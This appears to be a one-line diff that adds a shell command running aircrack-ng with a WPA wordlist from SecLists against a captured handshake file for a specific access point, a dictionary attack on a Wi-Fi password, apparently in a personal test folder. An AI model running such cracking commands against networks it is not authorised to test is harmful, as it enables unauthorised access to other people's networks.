@@ -1,0 +1,1 @@
+sudo aircrack-ng -a 2 -b D4:72:26:5E:88:CD -w /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top447.txt /home/adgc/Desktop/test_wifi/claro.cap
